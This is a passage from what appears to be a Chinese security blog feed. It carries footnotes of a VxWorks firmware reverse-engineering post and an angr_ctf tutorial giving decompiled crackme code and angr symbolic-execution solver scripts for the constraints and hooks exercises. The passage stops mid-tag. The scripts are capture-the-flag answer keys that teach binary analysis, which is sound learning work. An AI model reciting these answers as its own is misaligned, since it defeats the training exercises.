href="https://download.schneider-electric.com/files?p_enDocType=Firmware+-+Updates&amp;p_File_Name=140NOE77101+For+Non+Unity+Users+V6.4.zip&amp;p_Doc_Ref=140NOE77101+Exec+and+Release+Notes+For+Non+Unity+Users">测试附件下载地址 (schneider-electric.com)</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://ayesawyer.github.io/2019/08/02/IDA-Pro%E6%89%A9%E5%B1%95%E2%80%94%E2%80%94%E8%84%9A%E6%9C%AC-%E6%8F%92%E4%BB%B6/">IDA Pro扩展——脚本+插件 | Aye’s house</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://rootkiter.com/2017/03/08/PowerPC_Study.html">PPC学习笔记</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://ghidra-sre.org/">Ghidra (ghidra-sre.org)</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://www.ee.ryerson.ca/~courses/ee8205/Data-Sheets/Tornado-VxWorks/vxworks/ref/loginLib.html">loginLib (ryerson.ca)</a><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><a href="https://qianfei11.github.io/2020/07/05/施耐德140NOE77101固件逆向分析/#How-VxWorks-System-Works">施耐德140NOE77101固件逆向分析 - B3ale (qianfei11.github.io)</a><a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:7" class="footnote-text"><span><a href="https://www.anquanke.com/post/id/187792">工控安全入门（五）—— plc逆向初探 - 安全客，安全资讯平台</a><a href="#fnref:7" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vxworks</tag>
      
      <tag>firmware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【angr_ctf】二进制分析工具angr使用与练习-Part III（进阶篇）</title>
    <link href="/article/26999.html"/>
    <url>/article/26999.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文是<code>angr_ctf</code>练习的最后一篇，这次会完成剩下的6道题目，结束<code>angr</code>的练习，后续可能会发布<code>angr</code>在实际软件符号执行中的应用文章。本文为<strong>进阶篇</strong>，通过这次练习，了解<code>angr</code>更多的使用技巧，废话不多说，马上开始。</p><h2 id="12-angr-veritersting"><a href="#12-angr-veritersting" class="headerlink" title="12_angr_veritersting"></a>12_angr_veritersting</h2><div class="note note-success">            <p>本题考查<code>angr</code>中<code>veritersting</code>选项的使用，解决路径爆炸</p>          </div><p>在创建<code>smigr</code>的时候设置<code>veritersting=True</code>，这个还不太懂，先放着后面解释。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>binary</tag>
      
      <tag>symbolic_execution</tag>
      
      <tag>static_analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【angr_ctf】二进制分析工具angr使用与练习-Part II（提高篇）</title>
    <link href="/article/3571.html"/>
    <url>/article/3571.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文是<code>angr_ctf</code>练习的第二篇，上一篇<a href="https://blog.gentlecp.com/article/61784.html">【angr_ctf】二进制分析工具angr使用与练习-Part I（基础篇）</a>主要讲解了其中的前7道题目，本篇为<strong>提高篇</strong>，在难度上会有所提升，许多细节在上一篇说过的，这里不再赘述，直接进入题目分析。</p><h2 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h2><div class="note note-success">            <p>本题考查对约束求解中约束条件的使用，以解决符号执行中常见的<strong>路径爆炸</strong>的问题</p>          </div><p>关于符号执行的<strong>路径爆炸</strong>问题，可以参考阅读<a href="https://zhuanlan.zhihu.com/p/26927127">符号执行入门 - 知乎 (zhihu.com)</a>，这里我们重点放在对题目的理解上，先看一下反编译的源码：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  password <span class="token operator">=</span> <span class="token number">1247302221</span><span class="token punctuation">;</span>  dword_804A044 <span class="token operator">=</span> <span class="token number">1381587531</span><span class="token punctuation">;</span>  dword_804A048 <span class="token operator">=</span> <span class="token number">1162562891</span><span class="token punctuation">;</span>  dword_804A04C <span class="token operator">=</span> <span class="token number">1113212494</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x11u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%16s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">134520912</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">134520912</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">15</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">check_equals_MRXJKZYRKMKENFZB</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token number">0x10u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>_BOOL4 __cdecl <span class="token function">check_equals_MRXJKZYRKMKENFZB</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-8h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-4h]</span>  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">0x804A040</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token operator">++</span>v3<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v3 <span class="token operator">==</span> a2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>程序对输入的16字节数据的每一位做了<code>complex_function</code>变换，然后对字符串中每一个字符依次比较，虽然函数名称告诉了要比较的字符串为<code>MRXJKZYRKMKENFZB</code>，但我们还是从源码上解读一下：</p><p>程序一开始初始化了4个全局变量，将其转换成字符串表示，得到结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210504150649.png" alt=""></p><p>再看4个变量在<code>.bss</code>段中存储的地址：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210504152320.png" alt=""></p><p>结合比较函数中<code>*(_BYTE *)(i + a1) == *(_BYTE *)(i + 0x804A040)</code>，刚好实现了对应字符的比较。</p><blockquote><p>这里有个注意的点，因为程序采用小端序，因此保存的字符串是<code>JXRM</code>，在比较的时候则是<code>MRXJ</code></p></blockquote><p>由于在比较的时候循环比较单个字符(共16个)，因此做符号执行的时候会存在$2^{16}=65536$条路径，直接原地爆炸，根据我们的分析，实际上只需要在进入<code>check_equals_MRXJKZYRKMKENFZB()</code>函数时，存储在<code>buffer</code>中的字符串为<code>MRXJKZYRKMKENFZB</code>即可，这相当于我们的约束条件，避免进入循环一一比较字符。</p><p>因此，这里首先确定两个地址：</p><ul><li><code>buffer</code>地址：需要往此处插入符号变量</li><li><code>check_equals_MRXJKZYRKMKENFZB</code>函数地址：到此处的时候直接根据约束条件进行求解</li></ul><p>通过<code>ida</code>可以直接查看到这两处数值：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210506225202.png" alt=""></p><p>起始地址直接选择<code>scanf</code>之后的两个地址其一即可，我选择的是<code>0x08048622</code></p><p>本题还用到了<code>state.memory.load(addr, bytes)</code>函数，用于在指定内存地址中读取指定字节的数据，这部分是为了我们直接获取<code>buffer</code>的内容，然后和我们的目标字符串比较。</p><p>下面是题解，我在必要的地方添加了注释，帮助理解：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">"./08_angr_constraints"</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">,</span> auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    start_address <span class="token operator">=</span> <span class="token number">0x8048622</span>    buff_addr <span class="token operator">=</span> <span class="token number">0x0804A050</span>    address_to_check_constraint <span class="token operator">=</span> <span class="token number">0x08048565</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    passwd_length <span class="token operator">=</span> <span class="token number">16</span>    password0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'password0'</span><span class="token punctuation">,</span> passwd_length <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment"># 在buffer的内存地址中添加符号变量</span>    initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>buff_addr<span class="token punctuation">,</span> password0<span class="token punctuation">)</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token comment"># 寻找进行字符比较函数的路径，不直接进入该路径</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>address_to_check_constraint<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        constrained_parameter_address <span class="token operator">=</span> buff_addr        constrained_parameter_size_bytes <span class="token operator">=</span> <span class="token number">16</span>        <span class="token comment"># 利用memory.load接口读取buffer处内存数据，用于比较，读取结果为BV</span>        constrained_parameter_bitvector <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>            constrained_parameter_address<span class="token punctuation">,</span>            constrained_parameter_size_bytes        <span class="token punctuation">)</span>        <span class="token comment"># 约束条件中需要直接比较的字符串</span>        constrained_parameter_desired_value <span class="token operator">=</span> <span class="token string">'MRXJKZYRKMKENFZB'</span>        <span class="token comment">#　添加约束条件</span>        solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>constrained_parameter_bitvector <span class="token operator">==</span> constrained_parameter_desired_value<span class="token punctuation">)</span>        <span class="token comment"># 约束求解</span>        solution0 <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>password0<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success, flag is: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution0<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210506225229.png" alt=""></p><h2 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h2><div class="note note-success">            <p>本题考查对<code>angr</code>中<code>hook</code>的使用，替代直接的约束条件</p>          </div><p>上源码：</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  _BOOL4 v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token string">"MRXJKZYRKMKENFZB"</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x11u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%16s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">134520916</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">134520916</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">18</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>  equals <span class="token operator">=</span> <span class="token function">check_equals_MRXJKZYRKMKENFZB</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>buffer<span class="token punctuation">,</span> <span class="token number">0x10u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">134520900</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">134520900</span><span class="token punctuation">)</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%16s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> equals <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> password<span class="token punctuation">,</span> <span class="token number">0x10u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  equals <span class="token operator">=</span> v3<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>_BOOL4 __cdecl <span class="token function">check_equals_MRXJKZYRKMKENFZB</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-8h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-4h]</span>  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">0x804A044</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token operator">++</span>v3<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v3 <span class="token operator">==</span> a2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> __cdecl <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token operator">||</span> a1 <span class="token operator">></span> <span class="token number">90</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>a1 <span class="token operator">-</span> <span class="token number">65</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> a2<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>还是一样的味道，程序预先将<code>password</code>设定为<code>MRXJKZYRKMKENFZB</code>，然后对用户的输入进行变换比较，在变换的时候采用了单个字符的循环对比，同样地，我们需要在程序执行到这部分的时候接管对比的操作。</p><p>之前，我们是先<code>explore</code>找到<code>check</code>的地址，然后比较此时<code>buffer</code>在内存中存储的字符串是否与目标相符。<code>angr</code>提供了更为强大的操作，即<code>hook</code>。</p><div class="note note-info">            <p><strong>百度百科中对<code>hook</code>的解释</strong>：Hook是Windows中提供的一种用以替换<a href="https://baike.baidu.com/item/DOS/32025">DOS</a>下“中断”的<a href="https://baike.baidu.com/item/系统机制/8159220">系统机制</a>，中文译为“挂钩”或“钩子”。在对特定的系统事件进行hook后，一旦发生已hook事件，对该事件进行hook的程序就会收到系统的通知，这时程序就能在第一时间对该事件做出响应。</p>          </div><p>在编程中采用<code>hook</code>，则是希望在指定事件发生时，能够接管操作，跳过相应指令的执行。据此，我们只要找到<code>check_equals_MRXJKZYRKMKENFZB</code>函数的地址，在此处添加<code>hook</code>，实现<code>buffer</code>中字符串与<code>password</code>的比较即可。</p><blockquote><p>关于<code>angr</code>中<code>hook</code>的具体使用可以参考<a href="https://docs.angr.io/extending-angr/simprocedures#user-hooks">Programming SimProcedures - angr Documentation</a> </p></blockquote><div class="note note-info">            <p><code>angr</code>中对于<code>hook</code>的使用有两种方式：</p><ul><li><p>一是装饰器：传入需要<code>hook</code>的地址和要跳过的指令长度，当程序执行到该地址时，执行<code>hook_func</code>中的内容，返回后继续在<code>hook_addr+skip_length</code>的地方继续执行（若<code>length=0</code>则不会触发<code>hook</code>）。该方法适用于函数不需要参数，也不考虑函数返回值的时候，当你要处理的函数包含对参数的操作，并且需要处理返回值，此时采用方法二</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@project<span class="token punctuation">.</span>hook</span><span class="token punctuation">(</span>hook_addr<span class="token punctuation">,</span> length<span class="token operator">=</span>instruction_length_to_skip<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hook_func</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># do somethings</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></li><li><p>二是<code>hook_symbol</code>：通过继承<code>angr.SimProcedure</code>，并重写<code>run</code>方法，可以实现对一个原始函数的完全模拟，包括函数的参数和返回值，下面演示了一个对原始函数的<code>hook</code>过程</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 原始函数</span><span class="token builtin">int</span> add_if_positive<span class="token punctuation">(</span><span class="token builtin">int</span> a<span class="token punctuation">,</span> <span class="token builtin">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> b <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment"># hook</span><span class="token keyword">class</span> <span class="token class-name">ReplacementAddIfPositive</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> a <span class="token operator">>=</span> <span class="token number">0</span> <span class="token keyword">and</span> b <span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> a <span class="token operator">+</span> b        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">0</span>func_name <span class="token operator">=</span> <span class="token string">'add_if_positive'</span>project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span>func_name<span class="token punctuation">,</span> ReplacementAddIfPositive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li></ul>          </div><p>除此之外，还需要思考一个问题，对于<code>hook</code>装饰的函数，我们如何提供函数的返回值（检查对比结果）？</p><p>为此，我们先对函数本身如何处理返回值进行查看：</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210506222154.png" alt=""></p><p>在<code>angr</code>中通过<code>claripy.If(条件,条件为True时的返回值,条件为False时的返回值)</code>实现，我们只需要将条件设置为两字符串比较，相同时返回1(BV)，不同时返回0(BV)即可。</p><p>最后，我们找一下需要的地址，由于我们目的是接管<code>check</code>函数部分的指令，因此程序的初始化状态选择入口状态即可（不需要自定义一个空白状态，传入符号变量）：</p><ul><li>检测函数<code>check_equals_MRXJKZYRKMKENFZB</code>地址</li></ul><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/image-20210506223436710.png" alt="image-20210506223436710"></p><ul><li><code>buffer</code>地址</li></ul><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210506224021.png" 